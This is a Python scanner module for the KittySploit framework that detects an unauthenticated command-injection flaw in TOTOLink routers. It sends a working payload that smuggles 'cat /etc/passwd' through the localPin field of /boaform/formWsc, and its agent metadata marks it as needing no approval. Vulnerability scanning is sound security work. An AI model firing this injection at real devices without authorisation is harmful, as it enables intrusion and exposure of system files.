#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TOTOLink Router - Remote Command Execution Detection',
        'description': 'TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'totolink', 'rce', 'router', 'boaform', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/fizz-is-on-the-way/Iot_vuls/blob/main/N150RT/RCE_formWsc/README.md'],
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/boaform/formWsc'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='TOTOLink Router - Remote Command Execution detected', path=path)
            return True
        return False

